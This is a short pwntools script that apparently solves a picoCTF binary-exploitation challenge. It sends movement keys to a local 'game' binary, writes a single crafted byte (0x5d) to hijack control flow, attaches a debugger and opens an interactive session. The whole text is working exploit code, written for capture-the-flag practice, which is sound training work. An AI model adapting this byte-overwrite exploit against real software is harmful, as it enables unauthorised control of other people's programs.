from pwn import *
context.log_level="debug"
sh=process("./game")
# sh=remote("saturn.picoctf.net", 63743)
for i in range(4):
    sh.sendline(b'w')
for i in range(63-16):
    sh.sendline(b'd')
sh.sendline(b'l'+b'\x5d')
gdb.attach(sh,"b *0x804953F\nc")
pause()
sh.sendline(b'w')
sh.interactive()